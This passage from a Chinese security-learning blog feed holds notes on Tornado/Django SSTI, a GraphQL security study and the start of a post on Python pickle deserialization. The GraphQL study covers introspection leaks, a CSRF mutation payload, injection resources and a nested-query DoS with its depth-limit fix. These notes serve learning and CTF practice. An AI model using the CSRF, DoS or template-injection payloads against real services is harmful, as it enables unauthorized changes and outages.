&lt;pre tabindex="0">&lt;code>{%raw eval(&amp;#39;3-1&amp;#39;)%}
&lt;/code>&lt;/pre>&lt;p>&lt;code>extends&lt;/code>可以接收文件路径作为参数来包含文件，如果该文件本身存在恶意的ssti payload，那将会被执行&lt;/p>
&lt;p>（栗子可参见 [QWB2021 Quals]托纳多，结合了sql注入+sql文件写入&lt;/p>
&lt;h1 id="django">Django&lt;/h1>
&lt;p>Django是一个python的web框架，相比flask比较庞大一点点；p牛的这篇文章-&amp;gt;&lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python 格式化字符串漏洞（Django为例）&lt;/a>指出了一种利用思路，通过Django默认的admin的model来获取settings对象，进而获取数据库账号密码、web加密密钥等信息&lt;/p>
&lt;hr>
&lt;p>两周之前基本总结过了，但是前两天遇到要构造的具体场景还是打不穿，于是又捋了一遍利用的思路，把笔记整理出来了&lt;/p>
&lt;p>这个故事告诉我们学东西要扎实，更扎实一点，不然会很蛋疼&lt;/p></description></item><item><title>GraphQL学习笔记</title><link>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</link><pubDate>Fri, 03 Sep 2021 20:56:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</guid><description>&lt;h2 id="graphql简述">GraphQL简述&lt;/h2>
&lt;p>GraphQL是一种针对Graph（图状数据）查询很有优势的Query Language（查询语言），而涉及到存储时可以选择NoSQL, SQL或其它任意存储方式（例如文本文件、存内存里等）；这是一门便于前后端交互的语言，而不是便于后端和数据库交互的语言。&lt;/p>
&lt;p>应用GraphQL的一个很重要的前提是后端数据已经以图的结构进行保存，（并且一定情况下已经设置好基于隐私的访问控制 授权与鉴权，否则会直接被攻击者执行高危操作）。每次查询或更新都有自己的根节点，得到的数据是树状结构；如果希望以图的形式展示则前端不能简单的对其进行缓存，那必须使用相应的存储数据库，通过顶点的ID把不同节点之间的某些边重新连接起来。&lt;/p>
&lt;p>并不是所有场景都需要迁移到GraphQL，如果RESTful API已经能满足需求的话。&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://twitter.com/jlouis666/status/1018140132153667584">GraphQL is basically just sugar for a simply typed lambda calculus.&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h3 id="变更---mutations">变更 - Mutations&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">three important things:&lt;/a>&lt;/p>
&lt;p>mutations are just queries in different namespace, but do NOT mix them;&lt;/p>
&lt;p>arguments require Input Objects, not normal Objects;&lt;/p>
&lt;p>use xyzAttributes for anything you want to link, then let your backend sort out how to do the linking(just like any other system we currently use)&lt;/p>
&lt;/blockquote>
&lt;h3 id="内省---introspection">内省 - introspection&lt;/h3>
&lt;p>GraphQL 允许在查询的任何位置请求 &lt;code>__typename&lt;/code>，一个元字段(Meta fields)，以获得那个位置的对象类型名称。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902180824151.png" alt="image-20210902180824151">&lt;/p>
&lt;p>我们也可以通过查询 &lt;code>__schema&lt;/code> 字段来向 GraphQL 询问哪些类型是可用的，类型有以下这些：&lt;/p>
&lt;ul>
&lt;li>Query, Character, Human, Episode, Droid - 这些是我们在类型系统中定义的类型。&lt;/li>
&lt;li>String, Boolean - 这些是内建的标量，由类型系统提供。&lt;/li>
&lt;li>&lt;code>__Schema&lt;/code>, &lt;code>__Type&lt;/code>, &lt;code>__TypeKind&lt;/code>, &lt;code>__Field&lt;/code>, &lt;code>__InputValue&lt;/code>, &lt;code>__EnumValue&lt;/code>, &lt;code>__Directive&lt;/code> - 这些有着两个下划线的类型是内省系统的一部分。&lt;/li>
&lt;/ul>
&lt;h2 id="敏感信息泄露越权">敏感信息泄露&amp;amp;越权&lt;/h2>
&lt;p>自动文档生成/解析 - &lt;a href="https://github.com/2fd/graphdoc">graphdoc&lt;/a> | &lt;a href="https://github.com/graphql/graphql-playground">graphql-playground&lt;/a> | &lt;a href="https://apis.guru/graphql-voyager/">graphql-voyager&lt;/a> &amp;hellip;&amp;hellip;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902183558042.png" alt="image-20210902183558042">&lt;/p>
&lt;p>由于对对象或属性的权限控制不完善，导致信息泄露，案例：&lt;a href="https://hackerone.com/reports/310946">hackerone 一系列信息泄露漏洞&lt;/a>&lt;/p>
&lt;p>在objects.types中寻找敏感信息，如email, password, secretkey, token, licensekey, session等，多多关注废弃字段（deprecated fields)。当字段被废弃后直接用&lt;code>__type&lt;/code>做内省确实查找不到，但当指定&lt;code>includeDreprecated: true&lt;/code>时，&lt;code>__type&lt;/code>仍然可以将废弃字段暴露出来。&lt;/p>
&lt;h2 id="graphql的认证方式">GraphQL的认证方式&lt;/h2>
&lt;p>GraphQL并没有规定任何身份认证和权限控制的相关内容，因此我们可以更灵活的在应用中实现各种粒度的认证和权限；但是也很容易写出一些“裸奔”的接口或无效认证无效的接口。&lt;/p>
&lt;h3 id="独立认证终端-restful">独立认证终端 (RESTful)&lt;/h3>
&lt;p>通用且官方推荐的方式，如果后端本身支持RESTful或有专门的认证服务器，可以修改少量代码实现GraphQL接口的认证。&lt;/p>
&lt;p>举例：添加jwt认证&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902200434456.png" alt="image-20210902200434456">&lt;/p>
&lt;h3 id="在graphql内认证">在GraphQL内认证&lt;/h3>
&lt;p>如果GraphQL的后端支持GraphQL不能支持RESTful，或全部请求都需要使用GraphQL，也可以用构造相关的Query Schema接口返回token的形式。&lt;/p>
&lt;p>举例：构造login的Query Schema，在返回值中携带token&lt;/p>
&lt;pre tabindex="0">&lt;code>type Query{
login(
username: String!
password: String!
): LoginMsg
type LoginMsg{
message: String
token: String
}
}
&lt;/code>&lt;/pre>&lt;p>在resolver中提供登录逻辑&lt;/p>
&lt;pre tabindex="0">&lt;code>import bcrypt from &amp;#39;bcrptjs&amp;#39;;
import jsonwebtoken from &amp;#39;jsonwebtoken&amp;#39;;
export const login = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const{username, password} = args;
const user = await db.collection(&amp;#39;User&amp;#39;).findOne({username: username});
if(await bcyrpt.compare(password, user.password)){
return{
message: &amp;#39;Login success&amp;#39;,
token: jsonwebtoken.sign({
user: user,
exp: Math.floor(Date.now() / 1000) + (60 * 60),
}, &amp;#39;your secret&amp;#39;),
};
}
}
&lt;/code>&lt;/pre>&lt;p>登录成功后 我们把token设置在请求头中，继续请求GraphQL的其他接口，这时需要对ApolloServer进行如下配置&lt;/p>
&lt;pre tabindex="0">&lt;code>const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || &amp;#39;&amp;#39;;
const user = getUser(token);
return{
...user,
...ctx,
...app.context
};
},
});
&lt;/code>&lt;/pre>&lt;p>实现getUser函数&lt;/p>
&lt;pre tabindex="0">&lt;code>const getUser = (token) =&amp;gt; {
let user = null;
const parts = token.split(&amp;#39; &amp;#39;);
if(parts.length === 2){
const scheme = parts[0];
const credentials = parts[1];
if(/^Bearer$/i.test(scheme)){
token = credentials;
try{
user = jwt.verify(token, JWT_SECRET);
console.log(user);
}catch(e){
console.log(e);
}
}
}
return user
}
&lt;/code>&lt;/pre>&lt;p>配置好ApolloServer后，在resolver中校验user&lt;/p>
&lt;pre tabindex="0">&lt;code>import {ApolloError, ForbiddenError, AuthenticationError} from &amp;#39;apollo-server&amp;#39;;
export const blogs = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const user = context.user;
if(!user){
throw new AuthenticationError(&amp;#39;You must be logged in to see blogs&amp;#39;);
}
const {blogId} = args;
const cursor = {}；
if(blogId){
cursor[&amp;#39;_id&amp;#39;] = blogId;
}
const blogs = await db
.collection(&amp;#39;blogs&amp;#39;)
.find(cursor)
.sort({publishedAt: -1})
.toArray();
return blogs;
}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902203603699.png" alt="image-20210902203603699">&lt;/p>
&lt;h2 id="更多安全漏洞">更多安全漏洞&lt;/h2>
&lt;p>Express-GraphQL：&lt;/p>
&lt;ul>
&lt;li>框架默认无防护&lt;/li>
&lt;li>自带GraphiQL&lt;/li>
&lt;/ul>
&lt;p>Graphene-Django：&lt;/p>
&lt;ul>
&lt;li>依赖Django的安全配置（Secure As Default）&lt;/li>
&lt;li>自带GraphiQL&lt;/li>
&lt;/ul>
&lt;p>GraphQL-PHP&lt;/p>
&lt;ul>
&lt;li>无关框架&lt;/li>
&lt;/ul>
&lt;h3 id="express-graphql-endpoint-csrf漏洞">Express-GraphQL Endpoint CSRF漏洞&lt;/h3>
&lt;pre tabindex="0">&lt;code>{&amp;#34;query&amp;#34;:&amp;#34;mutation {\n editProfile(name:\&amp;#34;hacker\&amp;#34;, age: 5) {\n name\n age\n }\n}&amp;#34;,&amp;#34;variables&amp;#34;:null}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902205831949.png" alt="image-20210902205831949">&lt;/p>
&lt;p>将Content-Type修改为application/x-www-form-urlencode，仍可成功执行&lt;/p>
&lt;pre tabindex="0">&lt;code>query=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20
5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210011480.png" alt="image-20210902210011480">&lt;/p>
&lt;p>直接配合burp自带的Generate CSRD POC&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210221214.png" alt="image-20210902210221214">&lt;/p>
&lt;h3 id="graphiql-clickjacking-漏洞">GraphiQL Clickjacking 漏洞&lt;/h3>
&lt;p>参见：https://github.com/graphql/graphiql/issues/683&lt;/p>
&lt;p>可以配合burp自带的Clickbandit进行攻击&lt;/p>
&lt;h3 id="graphql-injection-漏洞">GraphQL injection 漏洞&lt;/h3>
&lt;p>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">这是一个相当全的payloads&amp;amp;exps&lt;/a> | &lt;a href="https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da">这是一个自省payload&lt;/a>&lt;/p>
&lt;p>p神ppt里的示意图直接搬过来了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211535481.png" alt="image-20210902211535481">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211551814.png" alt="image-20210902211551814">&lt;/p>
&lt;p>仍然是拼接了恶意的GraphQL语句导致漏洞的发生，本质还是对用户输入的控制不严格；同类的漏洞还有xss, rce等等&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">有语法就有解析，有解析就会有结构和顺序，有结构和顺序就会有注入。&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>用“参数化查询”的方式来解决上述问题时，要确保后端的解析引擎没有大病&lt;/p>
&lt;h3 id="通过custom-scalar的注入-json">通过Custom Scalar的注入 (JSON)&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">NoSQL Injection is entirely possible when using GraphQL, and can creep into your application through the use of &amp;lsquo;custom scalar types&amp;rsquo;&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>————更多的GraphQLi相关问题可参见&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">这个git仓库&lt;/a>，一本满足（&lt;/p>
&lt;h3 id="拒绝服务">拒绝服务&lt;/h3>
&lt;p>GraphQL中的query和mutation的返回结果都是可以有嵌套的对象的，如果不对嵌套深度进行限制，有可能被利用从而进行拒绝服务攻击。&lt;/p>
&lt;p>一个举例：&lt;/p>
&lt;p>定义了Blog和Author:&lt;/p>
&lt;pre tabindex="0">&lt;code>type Blog{
_id: String!
type: BlogType
avatar: String
title: String
content: [String]
author: Author
....
}
type Author{
_id: String!
name: String
blog: [Blog]
}
&lt;/code>&lt;/pre>&lt;p>都有各自的Query:&lt;/p>
&lt;pre tabindex="0">&lt;code>extend type Query{
blogs(
blogId: ID
systemType: String!
): [Blog]
}
extend type Query{
author(
_id: String
): Author
}
&lt;/code>&lt;/pre>&lt;p>我们可以构造这样的查询，无限套娃导致dos&lt;/p>
&lt;pre tabindex="0">&lt;code>query GetBlogs($blogId: ID, $systemType: String!) {
blogs(blogId: $blogId, systemType: $systemType) {
_id
title
type
content
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
# and so on...
}
}
}
}
}
}
}
}
}
}
}
}
}
title
createdAt
publishedAt
}
}
publishedAt
}
}
&lt;/code>&lt;/pre>&lt;p>解决这个问题我们需要在GraphQL服务器上限制查询深度，同时设计GraphQL接口时尽量避免出现此类问题，以Node.js为例，graphql-depth-limit就可以解决这样的问题&lt;/p>
&lt;pre tabindex="0">&lt;code>// ...
import depthLimit from &amp;#39;graphql-depth-limit&amp;#39;;
// ...
const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || &amp;#39;&amp;#39;;
const user = getUser(token);
console.log(&amp;#39;user&amp;#39;, user)
return{
...user,
...ctx,
...app.context
};
},
validationRules: [ depthLimit(10) ]
});
// ...
&lt;/code>&lt;/pre>&lt;h3 id="graphene-django-debug模式下的安全问题">Graphene-Django DEBUG模式下的安全问题&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903201318096.png" alt="image-20210903201318096">&lt;/p>
&lt;h2 id="在ctf中的表现">在CTF中的表现&lt;/h2>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;p>[corCTF 2021]devme&lt;/p>
&lt;h2 id="结尾">结尾&lt;/h2>
&lt;p>&lt;a href="https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application">Damn Vulnerable GraphQL Application&lt;/a>-&amp;gt; 一个漏洞复现的靶场，包含了上面提到和没提到的GraphQL存在的洞&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull dolevf/dvga
docker run -d -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903203245165.png" alt="image-20210903203245165">&lt;/p>
&lt;p>已经有&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">写好的wp&lt;/a>了 不向互联网产出湿垃圾 从我做起&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://graphql.cn/">中文官网&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://graphqlapp.herokuapp.com/">在线GraphiQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/zhouyuexie/learn-graphql">learn-graphql&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.zhihu.com/question/264629587">什么是 GraphQL？&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.secpulse.com/archives/148242.html">玩转graphQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903795407716366">GraphQL 从入门到实践&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903841813495822">【CuteJavaScript】GraphQL真香入门教程&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf">攻击GraphQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">GraphQL安全指北&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.shuzhiduo.com/A/RnJW3BRoJq/">UWP GraphQL数据查询的实现&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">GraphQL Mutations&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">GraphQL NoSQL Injection Through JSON Types&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/">GraphQL Injection&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">【安全记录】玩转GraphQL - DVGA靶场（上）&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/mmJrE6uIBC-4ztr5PFZasA">【安全记录】玩转GraphQL - DVGA靶场（下）&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;p>开学了，不摆烂从我做起&lt;/p></description></item><item><title>反序列化专题笔记·壹·python篇</title><link>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</link><pubDate>Thu, 12 Aug 2021 11:48:05 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</guid><description>&lt;h2 id="序列化反序列化">序列化&amp;amp;反序列化&lt;/h2>
&lt;p>在python中有好几个内置模块都可以干序列化&amp;amp;反序列化这个事，比如&lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label2">json&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label3">pickle&lt;/a>/&lt;a href="https://docs.python.org/2/library/pickle.html#module-cPickle">cpickle&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label4">shelve&lt;/a>, &lt;a href="https://docs.python.org/zh-cn/3/library/marshal.html">marshal&lt;/a>，而本文后面涉及到的序列化和反序列化操作若无特殊说明，指的都是pickle。&lt;/p>
&lt;p>pickle后的对象以二进制字节流存储，能表示python几乎所有的类型（包括自定义类型），比如&lt;/p>
&lt;ul>
&lt;li>&lt;code>None&lt;/code> 、 &lt;code>True&lt;/code> 和 &lt;code>False&lt;/code>&lt;/li>
&lt;li>整数、浮点数、复数&lt;/li>
&lt;li>str、byte、bytearray&lt;/li>
&lt;li>只包含可封存对象的集合，包括 tuple、list、set 和 dict&lt;/li>
&lt;li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）&lt;/li>
&lt;li>定义在模块最外层的内置函数&lt;/li>
&lt;li>定义在模块最外层的类&lt;/li>
&lt;li>&lt;code>__dict__&lt;/code> 属性值或 &lt;code>__getstate__()&lt;/code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）&lt;/li>
&lt;/ul>
&lt;p>当然也有例外，比如文件对象和网络套接字对象以及代码对象就不可以。&lt;/p>
&lt;p>对于一个Object，可以通过重写&lt;code>object.__reduce__()&lt;/code>函数，使其被序列化时按照重写的方式进行；此函数会返回一个&lt;code>(callable, ([para1, para2, ...])[, ...])&lt;/code>的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。&lt;/p>
&lt;p>pickle的常用方法有dumps(), loads()和dump(), load()，不带s的需要的参数是文件句柄，而带s的所需要的参数是字符串。&lt;/p>
&lt;p>说到pickle不得不谈的是opcode，即&lt;u>PVM(python virtual machine)&lt;/u>的操作码，它可以被PVM的解析引擎解释处理。目前opcode有多不同的实现版本（但向下兼容），其中py2和py3序列化的结果是不同的，可以在调用函数时指定协议版本。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;ver_&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># python3输出 protocol&amp;lt;=5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;(dp0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">V1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">sV2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">s.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x02&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_3&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_4&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
